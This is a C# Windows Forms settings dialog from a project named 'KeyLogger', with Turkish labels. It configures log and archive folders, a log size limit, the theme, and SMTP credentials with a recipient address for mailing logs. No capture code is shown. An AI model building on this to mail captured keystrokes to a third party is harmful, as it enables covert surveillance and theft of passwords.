using System;
using System.IO;
using System.Drawing;
using System.Windows.Forms;

namespace KeyLogger
{
	public class SettingsForm : Form
	{
		private TextBox txtLogDir;
		private TextBox txtArchiveDir;
		private NumericUpDown numMaxSizeMb;
		private Button btnBrowse;
		private Button btnBrowseArchive;
		private Button btnOk;
		private Button btnCancel;
		private ComboBox cmbTheme;
		private NumericUpDown numFontSize;
		private TextBox txtSmtpHost;
		private NumericUpDown numSmtpPort;
		private CheckBox chkSmtpSsl;
		private TextBox txtSmtpUser;
		private TextBox txtSmtpPass;
		private TextBox txtFromEmail;
		private TextBox txtRecipient;

		private AppSettings original;
		public AppSettings ResultSettings { get; private set; }

		public SettingsForm(AppSettings current)
		{
			Text = "Ayarlar";
			Width = 620;
			Height = 520;
			StartPosition = FormStartPosition.CenterParent;
			MinimumSize = new Size(600, 500);
			AutoScaleMode = AutoScaleMode.Font;

			original = current;
			ResultSettings = new AppSettings
			{
				LogDirectory = current.LogDirectory,
				MaxLogSizeBytes = current.MaxLogSizeBytes
			};

			var lblDir = new Label { Left = 10, Top = 20, Width = 140, AutoSize = true, Text = "Log Klasörü:" };
			txtLogDir = new TextBox { Left = 150, Top = 16, Width = 360, Text = ResultSettings.LogDirectory, Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right };
			btnBrowse = new Button { Left = 520, Top = 15, Width = 70, Text = "Seç", Anchor = AnchorStyles.Top | AnchorStyles.Right };
			btnBrowse.Click += (s, e) =>
			{
				using var fbd = new FolderBrowserDialog();
				if (Directory.Exists(txtLogDir.Text)) fbd.SelectedPath = txtLogDir.Text;
				if (fbd.ShowDialog(this) == DialogResult.OK)
				{
					txtLogDir.Text = fbd.SelectedPath;
				}
			};

			var lblArch = new Label { Left = 10, Top = 60, Width = 140, AutoSize = true, Text = "Arşiv Klasörü:" };
			txtArchiveDir = new TextBox { Left = 150, Top = 56, Width = 360, Text = ResultSettings.ArchiveDirectory, Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right };
			btnBrowseArchive = new Button { Left = 520, Top = 55, Width = 70, Text = "Seç", Anchor = AnchorStyles.Top | AnchorStyles.Right };
			btnBrowseArchive.Click += (s, e) =>
			{
				using var fbd = new FolderBrowserDialog();
				if (Directory.Exists(txtArchiveDir.Text)) fbd.SelectedPath = txtArchiveDir.Text;
				if (fbd.ShowDialog(this) == DialogResult.OK)
				{
					txtArchiveDir.Text = fbd.SelectedPath;
				}
			};

			var lblSize = new Label { Left = 10, Top = 100, Width = 140, AutoSize = true, Text = "Maks. Boyut (MB):" };
			numMaxSizeMb = new NumericUpDown { Left = 150, Top = 96, Width = 100, Minimum = 1, Maximum = 1024, Value = Math.Max(1, (decimal)(ResultSettings.MaxLogSizeBytes / (1024m * 1024m))) };

			var lblTheme = new Label { Left = 10, Top = 140, Width = 140, AutoSize = true, Text = "Tema:" };
			cmbTheme = new ComboBox { Left = 150, Top = 136, Width = 150, DropDownStyle = ComboBoxStyle.DropDownList };
			cmbTheme.Items.AddRange(new object[] { "Light", "Dark" });
			cmbTheme.SelectedItem = (ResultSettings.Theme == "Dark") ? "Dark" : "Light";

			var lblFont = new Label { Left = 10, Top = 180, Width = 140, AutoSize = true, Text = "Font Boyutu:" };
			numFontSize = new NumericUpDown { Left = 150, Top = 176, Width = 100, Minimum = 8, Maximum = 20, DecimalPlaces = 1, Increment = 0.5m, Value = (decimal)ResultSettings.FontSize };

			var grpEmail = new GroupBox { Left = 10, Top = 220, Width = 580, Height = 180, Text = "E-posta (SMTP)", Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right };
			var lblHost = new Label { Left = 10, Top = 25, Width = 100, AutoSize = true, Text = "Sunucu:" };
			txtSmtpHost = new TextBox { Left = 110, Top = 22, Width = 200, Text = current.SmtpHost, Anchor = AnchorStyles.Top | AnchorStyles.Left };
			var lblPort = new Label { Left = 320, Top = 25, Width = 50, AutoSize = true, Text = "Port:" };
			numSmtpPort = new NumericUpDown { Left = 370, Top = 22, Width = 60, Minimum = 1, Maximum = 65535, Value = current.SmtpPort };
			chkSmtpSsl = new CheckBox { Left = 440, Top = 23, Width = 70, Text = "SSL" , Checked = current.SmtpUseSsl };

			var lblUser = new Label { Left = 10, Top = 55, Width = 100, AutoSize = true, Text = "Kullanıcı:" };
			txtSmtpUser = new TextBox { Left = 110, Top = 52, Width = 200, Text = current.SmtpUser };
			var lblPass = new Label { Left = 320, Top = 55, Width = 50, AutoSize = true, Text = "Şifre:" };
			txtSmtpPass = new TextBox { Left = 370, Top = 52, Width = 180, UseSystemPasswordChar = true, Text = string.IsNullOrEmpty(current.GetSmtpPasswordOrEmpty()) ? string.Empty : current.GetSmtpPasswordOrEmpty() };

			var lblFrom = new Label { Left = 10, Top = 85, Width = 100, AutoSize = true, Text = "Gönderen:" };
			txtFromEmail = new TextBox { Left = 110, Top = 82, Width = 200, Text = current.FromEmail };
			var lblRcpt = new Label { Left = 320, Top = 85, Width = 50, AutoSize = true, Text = "Alıcı:" };
			txtRecipient = new TextBox { Left = 370, Top = 82, Width = 180, Text = current.RecipientEmail };

			grpEmail.Controls.AddRange(new Control[] { lblHost, txtSmtpHost, lblPort, numSmtpPort, chkSmtpSsl, lblUser, txtSmtpUser, lblPass, txtSmtpPass, lblFrom, txtFromEmail, lblRcpt, txtRecipient });

			btnOk = new Button { Left = 390, Top = 420, Width = 100, Text = "Tamam", Anchor = AnchorStyles.Bottom | AnchorStyles.Right };
			btnCancel = new Button { Left = 500, Top = 420, Width = 100, Text = "İptal", Anchor = AnchorStyles.Bottom | AnchorStyles.Right };
			AcceptButton = btnOk;
			CancelButton = btnCancel;

			btnOk.Click += (s, e) =>
			{
				ResultSettings.LogDirectory = Directory.Exists(txtLogDir.Text) ? txtLogDir.Text : ResultSettings.LogDirectory;
				ResultSettings.MaxLogSizeBytes = (long)(numMaxSizeMb.Value * 1024m * 1024m);
				ResultSettings.ArchiveDirectory = Directory.Exists(txtArchiveDir.Text) ? txtArchiveDir.Text : ResultSettings.ArchiveDirectory;
				ResultSettings.Theme = (string)cmbTheme.SelectedItem;
				ResultSettings.FontSize = (float)numFontSize.Value;
				ResultSettings.SmtpHost = txtSmtpHost.Text.Trim();
				ResultSettings.SmtpPort = (int)numSmtpPort.Value;
				ResultSettings.SmtpUseSsl = chkSmtpSsl.Checked;
				ResultSettings.SmtpUser = txtSmtpUser.Text.Trim();
				ResultSettings.FromEmail = txtFromEmail.Text.Trim();
				ResultSettings.RecipientEmail = txtRecipient.Text.Trim();
				if (!string.IsNullOrWhiteSpace(txtSmtpPass.Text)) ResultSettings.SetSmtpPassword(txtSmtpPass.Text);
				DialogResult = DialogResult.OK;
				Close();
			};

			btnCancel.Click += (s, e) =>
			{
				DialogResult = DialogResult.Cancel;
				Close();
			};

			Controls.Add(lblDir);
			Controls.Add(txtLogDir);
			Controls.Add(btnBrowse);
			Controls.Add(lblArch);
			Controls.Add(txtArchiveDir);
			Controls.Add(btnBrowseArchive);
			Controls.Add(lblSize);
			Controls.Add(numMaxSizeMb);
			Controls.Add(lblTheme);
			Controls.Add(cmbTheme);
			Controls.Add(lblFont);
			Controls.Add(numFontSize);
			Controls.Add(btnOk);
			Controls.Add(btnCancel);
			Controls.Add(grpEmail);
		}
	}
}

